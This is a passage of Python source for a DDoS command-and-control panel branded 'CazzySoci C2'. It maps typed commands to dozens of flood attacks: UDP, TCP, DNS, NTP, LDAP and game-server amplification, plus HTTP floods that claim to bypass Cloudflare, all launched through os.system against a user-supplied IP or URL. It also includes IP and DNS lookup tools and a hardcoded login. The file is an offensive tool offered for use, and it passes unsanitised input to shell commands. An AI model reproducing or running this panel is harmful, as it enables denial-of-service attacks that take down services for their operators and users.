                time = cnc.split()[4]
                os.system(f'python3 udp.py {ip} {port} {packets} 100 {time} ')
            except IndexError:
                print('Usage: udp <ip> <port> <packet> <time>')
                print('Example: udp 1.1.1.1 80 1000 10000')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('Usage: nfo-killer <ip> <port> <threads> <time>')
                print('Example: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('Usage: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                connections = cnc.split()[3]
                psize = cnc.split()[4]
                pps = cnc.split()[5]
                os.system(f'./tcp-bypass {ip} {port} {connections} {psize} {pps}')
            except IndexError:
                print('Usage: tcp <ip> <port> <connections> <packetsize> <pps>')
                print('Example: tcp 1.1.1.1 80 1000 2000 1000')

        elif "dns" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'python3 DNS.py {ip} {port} {time} 65535 {threads}')
            except IndexError:
                print('Usage: dns <ip> <port> <time> <packet_size> <threads>')
                print('Example: dns 1.1.1.1 80/53 10000 100')

        elif "csamp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'python3 AMP.py {ip} {port} {time} 65535 {threads}')
            except IndexError:
                print('Usage: csamp <ip> <port> <time> <threads>')
                print('Example: csamp 1.1.1.1 80 10000 100')

        elif "csbrutal" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'python3 udp-brutal.py {ip} {port} {time} 65535 {threads}')
            except IndexError:
                print('Usage: csbrutal <ip> <port> <time> <threads>')
                print('Example: csbrutal 1.1.1.1 80 10000 100')

# SPECIAL METHODS

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')
                
# AMP/GAMES METHODS

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python3 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

# LAYER 7 METHODS
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')

        elif "spike" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node spike.js {url} 20 {time}')
            except IndexError:
                print('Usage: spike.js <url> <threads> <time>')
                print('Example: spike https://example.com 100 1000')
    
        elif "getaway" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                ratelimit = cnc.split()[3]
                os.system(f'node getaway.js {target} {time} 100 {ratelimit} proxy.txt')
            except IndexError:
                print('Usage: getaway.js <url> <time> <ratelimit>')
                print('Example: getaway https://vailon.com 1000 100')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET.js {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW.js {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS.js {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')

        elif "bypass2" in cnc:
            try:
                method = cnc.split()[1]
                url = cnc.split()[2]
                time = cnc.split()[3]
                thread = cnc.split()[4]
                os.system(f'node bypass2.js {method} {url} {time} {thread} 100 proxy.txt')
            except IndexError:
                print('Usage: bypass2 <GET/POST> <target> <time> <threads>')
                print('Example: bypass2 GET/POST http://example.com 60 10 ')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip> <http.txt>')
                print('Example: uambypass http://example.com 60 100 http.txt')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')

        elif "httpskill" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]  
                thread = cnc.split()[3]
                ratelimit = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'node httpskill.js {url} {time} {thread} {ratelimit} {proxy}')
            except IndexError:
                print('Usage: httpskill <url> <time> <thread> <ratelimit> <proxy>')
                print('Example: httpskill https://example.com 10000 100 90 proxy.txt')

        elif "cfstrong" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                method = cnc.split()[3] 
                proxy = cnc.split()[4] 
                per = cnc.split()[5] 
                os.system(f'node CFSTRONG.js {url} 10000 {threads} {method} {proxy} {per}')
            except IndexError:
                print('Usage:   cfstrong [Target] [Threads] [Method] [Proxy List] [Requests Per IP]')
                print('Example: cfstrong https://eaxample.com 5000 GET/POST proxy.txt 60')

        elif "mix" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]  
                thread = cnc.split()[3]
                os.system(f'node mix.js {url} {time} 100 {thread} proxy.txt')
            except IndexError: 
                print('Usage: mix <url> <time> <thread>')
                print('Example: mix https://example.com/ 1000 10')
       

        elif "tlsbypass" in cnc:
            try: 
                url = cnc.split()[1]
                time = cnc.split()[2]  
                thread = cnc.split()[3]
                os.system(f'node tls-bypass.js {url} {time} 100 {thread} proxy.txt')
            except IndexError:
                print('Usage: tlsbypass <target> <time> <thread>')
                print('Example: tlsbypass https://www.google.com 1000 10  ')

        elif "stroke" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]  
                rps = cnc.split()[3]
                threads = cnc.split()[4]
                proxy = cnc.split()[5]
                os.system(f'node stroke.js {url} {time} {rps} {threads} {proxy}')
            except IndexError:
                print('Usage: murder <url> <time> <rps> <threads> <proxy>')
                print('Example: stroke https://target.com 120 32 10 proxy.txt')

        elif "bypass" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node bypass.js {target} {time} 100 {thread} proxy.txt')
            except IndexError:
                print('Usage: bypass <target> <time> <threaad> ')
                print('Example: bypass https://example.com 10000 100')
        
        elif "hold" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node hold.js {target} {time} 100 {thread} proxy.txt')
            except IndexError:
                print('Usage: hold <target> <time> <thread>')
                print('Example: hold https://example.com 10000 100')

        elif "csnuke" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node Nuker.js {target} {time} 500 proxy.txt 100')
            except IndexError:
                print('Usage: csnuke <host> <time>')
                print('Example: csnuke http://example.com/ 10000')

        elif "csraw" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node raw.js {target} {time}')
            except IndexError:
                print('Usage: csraw <target> <time>')
                print('Example: csraw http://example.com/ 10000 ')
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')
                
        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS 
AMP     ► SHOW AMP METHODS
SPECIAL ► SHOW SPECIAL METHODS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "cazzysocilulz"
    passwd = "cazc2"
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("The password you entered is incorrect")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome to CazzySoci C2!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
